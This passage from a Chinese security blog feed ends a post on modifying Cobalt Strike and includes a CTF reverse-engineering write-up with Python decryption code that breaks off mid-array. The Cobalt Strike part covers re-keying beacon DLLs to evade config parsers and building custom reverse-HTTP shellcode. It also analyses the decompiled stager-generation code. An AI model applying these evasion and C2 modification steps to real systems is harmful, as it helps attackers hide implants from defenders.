CrackSleeve</a>**程序解密这些DLL，在修改完密钥之后再加密回去即可。需要注意的是，在解密的时候需要将程序中默认的密钥改成4.4版本的。</p><p><img src="/images/%E4%BF%AE%E6%94%B9CrackSleeve%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5.png" alt="修改CrackSleeve的默认密钥"></p><p><img src="/images/%E6%89%A7%E8%A1%8CCrackSleeve%E8%A7%A3%E5%AF%86.png" alt="执行CrackSleeve解密"></p><p>其中以x64结尾的是64位文件，x86或者没有后缀名的为32位文件。使用IDA打开beacon.dll，搜索0x2e，找到之后修改成与服务端相同的密钥即可。</p><p><img src="/images/IDA%E9%80%89%E6%8B%A9%E6%90%9C%E7%B4%A2%E7%AB%8B%E5%8D%B3%E6%95%B0.png" alt="IDA选择搜索立即数"></p><p><img src="/images/IDA%E6%90%9C%E7%B4%A2%E6%A1%86%E8%BE%93%E5%85%A50x2e.png" alt="IDA搜索框输入0x2e"></p><p><img src="/images/%E5%AE%9A%E4%BD%8D%E5%88%B0loc_1000A0CB%E5%A4%84.png" alt="定位到loc_1000A0CB处"></p><p>修改完成之后，选择Edit-&gt;Patch Program -&gt; Apply patches to input file保存文件修改即可。类似的，其他dll文件也需要修改密钥。修改完成密钥之后，执行encode加密操作，重新将修改后的dll加密回去，然后替换原来jar包中的DLL文件即可。需要修改的文件有beacon、dnsb、extc2、pivot以及这些文件的x64版本。</p><p><img src="/images/CrackSleeve%E6%89%A7%E8%A1%8C%E5%8A%A0%E5%AF%86.png" alt="CrackSleeve执行加密"></p><p>注意，在替换jar包中的sleeve文件时，需要提前备份原来的文件，防止修改之后，出现错误，导致程序无法使用。</p><p>修改混淆密钥前，使用<a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a>解析beacon的配置信息。</p><p><img src="/images/%E4%BF%AE%E6%94%B9%E6%B7%B7%E6%B7%86%E5%AF%86%E9%92%A5%E5%89%8D%E7%9A%84%E8%A7%A3%E6%9E%90%E7%BB%93%E6%9E%9C.png" alt="修改混淆密钥前的解析结果"></p><p>修改混淆密钥后再次解析。</p><p><img src="/images/%E4%BF%AE%E6%94%B9%E6%B7%B7%E6%B7%86%E5%AF%86%E9%92%A5%E5%90%8E%E7%9A%84%E8%A7%A3%E6%9E%90%E7%BB%93%E6%9E%9C.png" alt="修改混淆密钥后的解析结果"></p><p>生成32位、64位的分段exe程序上线成功。</p><p><img src="/images/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E5%88%86%E6%AE%B5%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="修改后的分段程序上线成功"></p><h4 id="其他一些特征修改"><a href="#其他一些特征修改" class="headerlink" title="其他一些特征修改"></a>其他一些特征修改</h4><ul><li>.cobaltstrike.beacon_keys和cobaltstrike.store这两个文件不要使用默认的文件，删除后生成新的。</li><li>profile文件要换新的，启动服务端时记得加载，或者直接把jar包里面的默认配置给改了</li><li>开在公网的teamserver不要使用默认端口</li></ul><h3 id="第三部分-改造增强"><a href="#第三部分-改造增强" class="headerlink" title="第三部分-改造增强"></a>第三部分-改造增强</h3><h4 id="shellcode自定义"><a href="#shellcode自定义" class="headerlink" title="shellcode自定义"></a>shellcode自定义</h4><p>ShellCode开发框架参考自<a href="https://github.com/mai1zhi2">快乐鸡哥</a>师傅和<a href="https://github.com/TonyChen56">鬼手</a>师傅，两位师傅YYDS。之所以参考两位师傅的，是因为快乐鸡哥师傅的shellcode框架里没有生成x64的，而鬼手师傅的代码里有64位的。</p><p><img src="/images/%E5%BF%AB%E4%B9%90%E9%B8%A1%E5%93%A5%E5%B8%88%E5%82%85%E7%9A%84%E4%BB%A3%E7%A0%81%E7%94%A8%E4%BA%86%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96%E8%BF%99%E4%B8%AA%E5%8F%AA%E8%83%BD%E7%BC%96%E8%AF%91x86%E7%8E%AF%E5%A2%83%E7%9A%84.png" alt="快乐鸡哥师傅的代码用了内嵌汇编这个只能编译x86环境的"></p><p><img src="/images/%E9%AC%BC%E6%89%8B%E5%B8%88%E5%82%85%E5%86%99%E7%9A%84%E6%A1%86%E6%9E%B6%E9%87%8C%E9%9D%A2%E5%AF%B9%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E4%BA%86%E5%88%A4%E6%96%AD.png" alt="鬼手师傅写的框架里面对编译环境进行了判断"></p><p>两位师傅写的代码搜索API的算法区别也比较大，笔者觉得这里应该参考快乐鸡哥师傅的。快乐鸡哥师傅的搜索算法是先定位函数所在DLL模块，再在模块内搜索，当调用函数较多时，这个方法效率比鬼手师傅的全局搜索效率要高，并且hash冲突的可能性也会比较低。</p><p><img src="/images/%E5%BF%AB%E4%B9%90%E9%B8%A1%E5%93%A5%E5%B8%88%E5%82%85%E7%9A%84%E4%BB%A3%E7%A0%81%E6%90%9C%E7%B4%A2%E6%AF%94%E8%BE%83%E5%BF%AB%E4%BA%9B.png" alt="快乐鸡哥师傅的代码搜索比较快些"></p><p><img src="/images/%E9%AC%BC%E6%89%8B%E5%B8%88%E5%82%85%E7%9A%84hash%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95%E6%98%AF%E7%AE%97%E4%B8%8ADLL%E6%A8%A1%E5%9D%97%E7%9A%84%E5%90%8D%E5%AD%97.png" alt="鬼手师傅的hash生成算法是算上DLL模块的名字"></p><p>笔者的目标是先搜寻内存当中的DLL模块的基址，再从基址遍历导出表计算导出函数HASH并对比获取导出函数的内存地址。为了得到Shellcode，需要首先分别计算出DLL模块名称的HASH和导出函数的HASH。</p><p><img src="/images/%E5%86%85%E5%AD%98%E4%B8%AD%E6%90%9C%E7%B4%A2%E5%8A%A0%E8%BD%BD%E7%9A%84DLL%E5%B9%B6%E8%AE%A1%E7%AE%97HASH.png" alt="内存中搜索加载的DLL并计算HASH"></p><p><img src="/images/%E6%94%B9%E9%80%A0%E7%89%88%E6%9C%AC%E7%9A%84%E8%AE%A1%E6%90%9C%E7%B4%A2HASH%E7%9A%84%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81.png" alt="改造版本的计搜索HASH的部分代码.png"></p><p>将生成的HASH数据导出到文件中保存。接下来将上线的C代码写好，生成shellcode，分别上线测试。</p><p>32位ShellCode上线成功。</p><p><img src="/images/32%E4%BD%8DShellCode%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="32位ShellCode上线成功"></p><p><img src="/images/32%E4%BD%8DShellCode%E5%8A%A0%E8%BD%BD%E5%99%A8.png" alt="32位ShellCode加载器"></p><p>64位ShellCode上线成功。</p><p><img src="/images/64%E4%BD%8DShellCode%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="64位ShellCode上线成功"></p><p><img src="/images/64%E4%BD%8DShellCode%E5%8A%A0%E8%BD%BD%E5%99%A8.png" alt="64位ShellCode加载器"></p><p>接下来分析CS的ShellCode生成替换过程。首先定位到ShellCode生成过程代码入口(aggressor/dialogs/PayloadGeneratorDialog)。</p><p><img src="/images/payload%E7%94%9F%E6%88%90%E5%85%A5%E5%8F%A3%E4%BB%A3%E7%A0%81.png" alt="payload生成入口代码"></p><p>首先判断格式，每个格式对应不同的语言代码模板。这里直接看原始的payload如何构造。</p><p><img src="/images/%E5%8E%9F%E5%A7%8Bpayload%E6%9E%84%E9%80%A0%E5%85%A5%E5%8F%A3.png" alt="原始payload构造入口.png"></p><p>根据前端用户的选项选择payload架构和监听器，然后将选项传入getListener函数，返回后调用getPayloadStager函数，继续跟进分析。</p><p><img src="/images/getListener%E5%87%BD%E6%95%B0%E4%BB%8E%E5%85%A8%E5%B1%80ScListener%E4%B8%AD%E8%BF%94%E5%9B%9E%E7%9B%91%E5%90%AC%E5%99%A8.png" alt="getListener函数从全局ScListener中返回监听器"></p><p>getListener通过监听器的名字从全局注册的监听器中搜索，并返回监听器对象。跟进ScListener对象的getPayloadStager函数分析。</p><p><img src="/images/getPayloadStager%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E4%BA%86ShellCode.png" alt="getPayloadStager函数直接返回了ShellCode"></p><p>getPayloadStager直接调用了Stagers.shellcode函数，跟进。</p><p><img src="/images/Stagers%E7%9A%84%E9%9D%99%E6%80%81%E7%B1%BB%E6%96%B9%E6%B3%95shellcode.png" alt="Stagers的静态类方法shellcode"></p><p>shellcode是个单例方法，最终会调用Stagers的对象方法resolve根据选择的监听器类型生成GenericStager，再调用generate方法生成shellcode。</p><p><img src="/images/resolve%E6%96%B9%E6%B3%95.png" alt="resolve方法"></p><p><img src="/images/%E6%B3%9B%E5%9E%8BStager%E7%94%9F%E6%88%90%E7%B1%BB.png" alt="泛型Stager生成类"></p><p>笔者这里自定义的ShellCode是reverse http，因此会进入GenericHTTPStagerX64和GenericHTTPStagerX86。</p><p><img src="/images/GenericHTTPStagerX64%E7%B1%BB%E5%AE%9A%E4%B9%89.png" alt="GenericHTTPStagerX64类定义"></p><p><img src="/images/GenericHTTPStagerX86%E5%AE%9A%E4%B9%89.png" alt="GenericHTTPStagerX86定义"></p><p>最终都会进入GenericHTTPStager的generate方法。</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] generate() &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">// 获取stager模板文件</span><br>         InputStream var1 = CommonUtils.resource(<span class="hljs-keyword">this</span>.getStagerFile());<br>         <span class="hljs-comment">// 读取模板文件到内存</span><br>         <span class="hljs-keyword">byte</span>[] var2 = CommonUtils.readAll(var1);<br>         String var3 = CommonUtils.bString(var2);<br>         var1.close();<br>         <span class="hljs-comment">// 获取监听器的host信息，最后添加一个unicode的0结尾，放到模板代码的最后</span><br>         var3 = var3 + <span class="hljs-keyword">this</span>.getListener().getStagerHost() + <span class="hljs-string">&#x27;\u0000&#x27;</span>;<br>         <span class="hljs-comment">// 创建一个packer对象</span><br>         Packer var4 = <span class="hljs-keyword">new</span> Packer();<br>         <span class="hljs-comment">// 设置为小端字节序</span><br>         var4.little();<br>         <span class="hljs-comment">// 添加监听器的端口</span><br>         var4.addShort(<span class="hljs-keyword">this</span>.getListener().getPort());<br>         AssertUtils.TestPatchS(var2, <span class="hljs-number">4444</span>, <span class="hljs-keyword">this</span>.getPortOffset());<br>         <span class="hljs-comment">// 替换shelllcode模板中端口偏移处的信息</span><br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getPortOffset());<br>         var4 = <span class="hljs-keyword">new</span> Packer();<br>         var4.little();<br>         <span class="hljs-comment">// 设置exit代码</span><br>         var4.addInt(<span class="hljs-number">1453503984</span>);<br>         AssertUtils.TestPatchI(var2, <span class="hljs-number">1453503984</span>, <span class="hljs-keyword">this</span>.getExitOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getExitOffset());<br>         var4 = <span class="hljs-keyword">new</span> Packer();<br>         var4.little();<br>         var4.addShort(<span class="hljs-keyword">this</span>.getStagePreamble());<br>         AssertUtils.TestPatchS(var2, <span class="hljs-number">5555</span>, <span class="hljs-keyword">this</span>.getSkipOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getSkipOffset());<br>         var4 = <span class="hljs-keyword">new</span> Packer();<br>         var4.little();<br>         <span class="hljs-comment">// 设置连接选项</span><br>         var4.addInt(<span class="hljs-keyword">this</span>.getConnectionFlags());<br>         AssertUtils.TestPatchI(var2, <span class="hljs-keyword">this</span>.isSSL() ? -<span class="hljs-number">2069876224</span> : -<span class="hljs-number">2074082816</span>, <span class="hljs-keyword">this</span>.getFlagsOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getFlagsOffset());<br>         String var5;<br>         <span class="hljs-comment">// 搜索303个X，搜索到的话，替换成headers信息</span><br>         <span class="hljs-keyword">if</span> (CommonUtils.isin(CommonUtils.repeat(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">303</span>), var3)) &#123;<br>            var5 = <span class="hljs-keyword">this</span>.getConfig().pad(<span class="hljs-keyword">this</span>.getHeaders() + <span class="hljs-string">&#x27;\u0000&#x27;</span>, <span class="hljs-number">303</span>);<br>            var3 = CommonUtils.replaceAt(var3, var5, var3.indexOf(CommonUtils.repeat(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">127</span>)));<br>         &#125;<br><br>         <span class="hljs-comment">// 搜索79个Y,然后替换成URI</span><br>         <span class="hljs-keyword">int</span> var6 = var3.indexOf(CommonUtils.repeat(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">79</span>), <span class="hljs-number">0</span>);<br>         var5 = <span class="hljs-keyword">this</span>.getConfig().pad(<span class="hljs-keyword">this</span>.getURI() + <span class="hljs-string">&#x27;\u0000&#x27;</span>, <span class="hljs-number">79</span>);<br>         var3 = CommonUtils.replaceAt(var3, var5, var6);<br>         <span class="hljs-comment">// 最终在尾部添加水印信息后返回</span><br>         <span class="hljs-keyword">return</span> CommonUtils.toBytes(var3 + <span class="hljs-keyword">this</span>.getConfig().getWatermark());<br>      &#125; <span class="hljs-keyword">catch</span> (IOException var7) &#123;<br>         MudgeSanity.logException(<span class="hljs-string">&quot;HttpStagerGeneric: &quot;</span> + <span class="hljs-keyword">this</span>.getStagerFile(), var7, <span class="hljs-keyword">false</span>);<br>         <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];<br>      &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><p>这里以32位shellcode为例，通过代码，模板文件为resources/httpstager.bin。在反编译jar包的源码中，找到该文件，用010Editor打开，再打开生成的shellcode文件，对比两者的差别。</p><p><img src="/images/010Editor%E5%AF%B9%E6%AF%94%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%A4%E8%80%85%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="010Editor对比得到的两者的区别"></p><p>第一处区别偏移是0xBF，十进制就是191，这个偏移正是GenericHTTPStagerX86类中定义的端口数据的偏移，teamserver监听端口为8088，16进制正是0x1f98，这里是小端存储，即981F。第三处区别的偏移是0x143，对比文件内容，正是替换Y的地方。前面是占位80字节的URI信息，后面是headers信息。</p><p><img src="/images/%E6%9B%BF%E6%8D%A2Y%E4%B8%BAheaders%E4%BF%A1%E6%81%AF.png" alt="替换Y为headers信息"></p><p><img src="/images/C2%E5%9C%B0%E5%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%B0%B4%E5%8D%B0%E4%BF%A1%E6%81%AF.png" alt="C2地址字符串和水印信息"></p><p>这里水印信息为499602D2。这些便是根据监听器配置生成的ShellCode数据。</p><p>经过上面的处理流程之后，最后通过common/CommonUtils.writeToFile将ShellCode直接写入文件。</p><p><img src="/images/%E7%9B%B4%E6%8E%A5%E5%B0%86%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6.png" alt="直接将二进制的数据写入文件"></p><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>其实前面这些魔改只是做的表面功夫，真正到实战当中还是会被实力强的杀软秒杀，比如卡巴斯基等。遇到这些对手，需要让beacon和其他后渗透模块高度自定义，这里面涉及到很多方面，静态和行为都需要改造，所以单从魔改CS的客户端、服务端和控制端已经远远不够了，并且灵活度太低，参考快乐鸡哥师傅用C#重写的SharpBeacon（师傅YYDS）。另外，鉴于改造CS的客户端这么麻烦，不如在搞清楚CS的内部原理之后，在外部建设一个Stager生成服务，通过CS的配置动态生成各种语言版本的Stager，这样省去了通过Agent动态替换JAVA指令的麻烦，灵活度大大增加。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/Twi1ight/CSAgent">https://github.com/Twi1ight/CSAgent</a></li><li><a href="https://github.com/ryanohoro/csbruter">https://github.com/ryanohoro/csbruter</a></li><li><a href="https://mp.weixin.qq.com/s/HibtLfikI_0ezcLVCRxqaA">https://mp.weixin.qq.com/s/HibtLfikI_0ezcLVCRxqaA</a></li><li><a href="https://mp.weixin.qq.com/s/0MPM3bysJJYr5jbRnES_Vg">https://mp.weixin.qq.com/s/0MPM3bysJJYr5jbRnES_Vg</a></li><li><a href="https://github.com/Sentinel-One/CobaltStrikeParser">https://github.com/Sentinel-One/CobaltStrikeParser</a></li><li><a href="https://github.com/CCob/BeaconEye">https://github.com/CCob/BeaconEye</a></li><li><a href="https://mp.weixin.qq.com/s/_gSPWVb1b-xuvhU6ynmw0Q">https://mp.weixin.qq.com/s/_gSPWVb1b-xuvhU6ynmw0Q</a></li><li><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-gong-ji-fang-yu/untitled-1">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-gong-ji-fang-yu/untitled-1</a></li><li><a href="https://github.com/TonyChen56/ShellCodeFrame">https://github.com/TonyChen56/ShellCodeFrame</a></li><li><a href="https://gitee.com/stemmm/CobaltstrikeSource">https://gitee.com/stemmm/CobaltstrikeSource</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>二开</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021西湖论剑两道逆向题目WP</title>
    <link href="/2021/11/21/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E4%B8%A4%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AEWP/"/>
    <url>/2021/11/21/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E4%B8%A4%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AEWP/</url>
    
    <content type="html"><![CDATA[<h2 id="TacticalArmed"><a href="#TacticalArmed" class="headerlink" title="TacticalArmed"></a>TacticalArmed</h2><p>函数sub_401160反调试，通过清空Dr7寄存器反调试。直接nop掉调用反调试的地方即可bypass。</p><p><img src="/images/pasted-87.png" alt="反调试部分"></p><p>接下来main函数先申请一段执行内存，然后对内存进行修改，最后添加ret指令返回。</p><p><img src="/images/pasted-88.png" alt="申请shellcode执行的内存"></p><p>通过调试，查看这一块执行的指令内容</p><p><img src="/images/pasted-89.png" alt="执行的shellcode内容"></p><p>经过分析，发现这一块指令执行的处理流程正是tea加密算法，其中四个密钥地址是405000到40500C，dump下来是[0x7CE45630, 0x58334908, 0x66398867, 0xC35195B1]。魔数是2 ** 32 - 0x7E5A96D2 = 0x81a5692e。结合代码，轮数是33。由于加密一次之后，没有对dword ptr ds:[405748]置0，因此在解密的时候，后面的数据都要累加前面的最终值。<br>解密代码：</p><p><img src="/images/pasted-90.png" alt="tea解密算法代码"></p><p>运行结果：</p><p><img src="/images/pasted-91.png" alt="运行得到flag"></p><p>附代码：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">v, k, num</span>):</span><br>    v0, v1 = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x81a5692e</span> <br>    k0, k1, k2, k3 = k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]<br><br>    total = c_uint32(delta * <span class="hljs-number">33</span> * num)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):                       <br>        v1.value -= ((v0.value&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value&gt;&gt;<span class="hljs-number">5</span>) + k3) <br>        v0.value -= ((v1.value&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value&gt;&gt;<span class="hljs-number">5</span>) + k1)  <br>        total.value -= delta<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value   <br>  <br><br><span class="hljs-comment"># test</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># ```</span><br>    <span class="hljs-comment"># 422F1DED 1485E472 035578D5 BF6B80A2  </span><br>    <span class="hljs-comment"># 97D77245 2DAE75D1 665FA963 292E6D74  </span><br>    <span class="hljs-comment"># 9795FCC1 0BB5C8E9 FFFFFFFF 00000001  </span><br>    <span class="hljs-comment"># ```</span><br>    <span class="hljs-comment"># 待加密的明文，两个32位整型，即64bit的明文数据</span><br>    value = [<span class="hljs-number">0x422F1DED</span>, <span class="hljs-number">0x1485E472</span>, <span class="hljs-number">0x35578D5</span>, <span class="hljs-number">0xBF6B80A2</span>, <span class="hljs-number">0x97D77245</span>, <span class="hljs-number">0x2DAE75D1</span>, <span class="hljs-number">0x665FA963</span>, <span class="hljs-number">0x292E6D74</span>, <span class="hljs-number">0x9795FCC1</span>, <span class="hljs-number">0x0BB5C8E9</span>]<br>    <span class="hljs-comment"># 四个key，每个是32bit，即密钥长度为128bit</span><br>    key = [<span class="hljs-number">0x7CE45630</span>, <span class="hljs-number">0x58334908</span>, <span class="hljs-number">0x66398867</span>, <span class="hljs-number">0xC35195B1</span>]<br>    <span class="hljs-comment"># print(&quot;Data is : &quot;, hex(value[0]), hex(value[1]))  </span><br>    <span class="hljs-comment"># res = encrypt(value, key)</span><br>    <span class="hljs-comment"># print(&quot;Encrypted data is : &quot;, hex(res[0]), hex(res[1]))</span><br>    flag = <span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span><br>    res = decrypt(value[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>], key, <span class="hljs-number">1</span>)<br>    flag += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">0</span>]) + struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">1</span>])<br>    res = decrypt(value[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>], key, <span class="hljs-number">2</span>)<br>    flag += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">0</span>]) + struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">1</span>])<br>    res = decrypt(value[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], key, <span class="hljs-number">3</span>)<br>    flag += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">0</span>]) + struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">1</span>])<br>    res = decrypt(value[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], key, <span class="hljs-number">4</span>)<br>    flag += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">0</span>]) + struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">1</span>])<br>    res = decrypt(value[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], key, <span class="hljs-number">5</span>)<br>    flag += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">0</span>]) + struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[<span class="hljs-number">1</span>])<br>    flag += <span class="hljs-string">b&#x27;&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></div></td></tr></table></figure><h2 id="ROR"><a href="#ROR" class="headerlink" title="ROR"></a>ROR</h2><p>查看程序发现是个编码表编码算法，通过编码表逆运算，数组下标转换为二进制格式，爆破偏移为0，再组合二进制数据转为字符</p><p><img src="/images/pasted-92.png" alt="IDA截图"></p><p>解题代码：</p><p><img src="/images/pasted-93.png" alt="解题代码截图"></p><p>运行结果：</p><p><img src="/images/pasted-94.png" alt="运行得到flag"></p><p>附代码:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag_bytes</span>(<span class="hljs-params">nums</span>):</span><br>    num_bins = [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums]<br>    flag_num_b = [[<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            flag_num_b[l][i] = num_bins[i][l]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag_num_b[i]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)])<br><br><br>flag_num = [<span class="hljs-number">0</span>, <span class="hljs-number">181</span>, <span class="hljs-number">122</span>, <span class="hljs-number">206</span>, <span class="hljs-number">37</span>, <span class="hljs-number">108</span>, <span class="hljs-number">7</span>, <span class="hljs-number">223</span>, <span class="hljs-number">0</span>, <span class="hljs-number">251</span>, <span class="hljs-number">124</span>, <span class="hljs-number">38</span>, <span class="hljs-number">75</span>, <span class="hljs-number">62</span>, <span class="hljs-number">134</span>, <span class="hljs-number">154</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">37</span>, <span class="hljs-number">144</span>, <span class="hljs-number">255</span>, <span class="hljs-number">28</span>, <span class="hljs-number">56</span>, <span class="hljs-number">176</span>, <span class="hljs-number">0</span>, <span class="hljs-number">231</span>, <span class="hljs-number">60</span>, <span class="hljs-number">121</span>, <span class="hljs-number">225</span>, <span class="hljs-number">144</span>, <span class="hljs-number">251</span>, <span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span 